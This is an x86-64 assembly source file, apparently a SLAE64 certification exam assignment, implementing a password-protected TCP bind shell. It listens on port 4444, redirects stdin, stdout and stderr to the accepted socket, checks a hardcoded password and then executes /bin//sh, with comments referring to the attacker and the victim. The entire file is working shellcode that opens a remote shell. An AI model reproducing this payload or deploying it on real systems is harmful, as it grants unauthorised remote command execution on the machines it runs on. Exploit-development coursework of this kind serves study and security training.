; File: tcp_bind_shell_pw.nasm
; Author: Kevin Ren, originally professor Vivek of SLAE64
; Purpose: assignment 1 of cert exam, a tcp bind shell with password protection assembly 64

; Syscall needed: 
; 			1. Socket 41
;			2. Bind 49
; 			3. Listen 50
; 			4. Accept 43
; 			5. Close 3
; 			6. Execve 59
;			7. Dup2 33
;			8. Read 0


; NOTE: PORT can be configured, through locating its particular
;	bytes and define it as a constant in a skeleton.c file
; 	however if we are simulating an attack, its better to leave it
; 	as least user/victim dependent.


global _start

section .text
	; constants
	PASSWORD: 	db 	"hello world",0xa	; as long its less than 15 characters
	pw_len		equ	$ - PASSWORD

exit: 				; in case password did not match
	jmp exiting
	; output something to attacker
	msg: db "genius, wrong password",0xa
	msg_len equ $ - msg
	
exiting:
	; write to socket output
	xor rax, rax
	mov al, 0x1
	xor rdi, rdi
	mov dil, 0x1
	lea rsi, [rel msg]
	xor rdx, rdx
	mov dl, msg_len
	syscall
	
	; close socket
	xor rax, rax
	mov al, 0x3
	xor rdi, rdi
	mov dil, r8b
	syscall

	; exit
	xor rax, rax
	mov al, 60
	xor rdi, rdi
	mov dil, 2
	syscall	


_start: 
	; zeroing out all necessary registers
	xor rax, rax	 		
	xor rdi, rdi
	xor rsi, rsi
	xor rdx, rdx
	xor rbx, rbx
	xor rcx, rcx

	; server_sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41
	
	mov al, 41
	mov dil, 2
	mov sil, 1
	;mov dl, 0
	syscall

	; returned server_socket type int will be moved to rdi/dil register
	mov dil, al
	
	; set up the struct sockaddr_in server argument for bind using the stack
	; server.sin_family = AF_INET
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = INADDR_ANY
	; bzero(server.sin_zero, 8)
	; REMEMBER: if we are using the stack, we need to push in reverse order, b/c the stack grows high to low
	push rbx			; server.sin_zero (8 bytes)
	mov dword [rsp - 4], ebx	; server.sin_addr (4 bytes)
	mov word [rsp - 6], 0x5c11	; server.sin_port (2 bytes)
	add bx, 2
	mov word [rsp - 8], bx		; server.sin_family (2 bytes)
	sub rsp, 8			; adjust stack

	; bind(server_sock, (struct sockaddr *)&server, sockaddr_len)
	mov al, 49
	mov rsi, rsp
	mov dl, 16
	syscall

	; listen(server_sock, MAXCLIENTS)
	mov al, 50
	xor rsi, rsi
	mov sil, 2
	syscall

	; comm_socket = accept(server_sock, (struct sockaddr *)&client, &sockaddr_len)
	; client structure is populated by the accept call
	; accept's third argument is an address to the length
	mov al, 43
	sub rsp, 16		; allocate 16 bytes on the stack for the client structure to be populated by accept call
	mov rsi, rsp
	mov byte [rsp -1], 16	; sockaddr_len
	sub rsp, 1
	mov rdx, rsp
	syscall	

	; returned communication socket will be moved to r8b register
	xor r8, r8
	mov r8b, al 
	
	; close(server_sock) 	
	mov al, 3 			; dil = server_sock
	syscall
	
	; move the comm_sock to dil
	mov dil, r8b 

	; dup2(comm_sock, 0/1/2) syscall #33
	mov al, 33		
	xor rsi, rsi			; second arg rsi -> 0 as stdin
	syscall

	mov al, 33
	mov sil, 1			; 1 as stdout
	syscall
	
	mov al, 33
	mov sil, 2			; 2 as stderror
	syscall

	
	
	; ASSIGNMENT 1 OF CERT EXAM. 
	; BEFORE EXECVE SYSCALL, READ FROM SOCKET INPUT
	; IF PASSWORD MATCHES, THEN PROCEED, IF NOT JMP TO EXIT
	; read(0, *buf, buf_len) syscall #0
	xor rax, rax	
	xor rdi, rdi					; NOTE: this is dangerous for any function calling code
	sub rsp, 16					; 	there is suspicion that the buffer can overflow the stack
	mov rsi, rsp					; 	however, in this case there is no function/label calling, thus
	xor rdx, rdx					; 	rip would never appear on the stack to be popped back into itself
	mov dl, 16
	syscall


compare_setup:
	; first check if its the same length
	cmp al, pw_len
	jnz exit

	; compare if matches with password
	lea rsi, [rsp]
	lea rdi, [rel PASSWORD]
	xor rcx, rcx
	mov cl, pw_len

compare:

	cmpsb						; NOTE: ; cmpsb automatically increments working registers (rdi, rsi)

	jnz exit

	loop compare


;	cmp dword [rsp], PASSWORD			; this method is only a passcode, not a passphrase, only 4 bytes, 
;	jnz exit


	; execve(args[0], &args[0], NULL) syscall #59	
	xor rax, rax
	xor rbx, rbx
        mov al, 59              
        
        ; execve arguments
        push rbx                                        ; pushing NULL (zeros)
        mov rcx, 0x68732f2f6e69622f                     ; pushing /bin//sh in reverse hex
        push rcx 
        mov rdi, rsp                                    ; filename /bin//sh (1st arg)

        push rbx                                        ; pushing NULL
        push rdi                                        ; push address of /bin//sh00000000
        mov rsi, rsp                                    ; argv[/bin//sh00000000, 00000000] (2nd arg)

        push rbx                                        ; pushing NULL
        mov rdx, rsp                                    ; envp[00000000] (3rd arg)

        ; NOTE: could have just pushed NULL, /bin//sh [first arg], NULL [third arg], /bin//shNULL (first arg) [second arg]

        syscall

	
	
	
	
section .data

	;PASSWORD	equ 	0x34333231		; 1234 in ascii, converted to hex, reversed for lil endianess
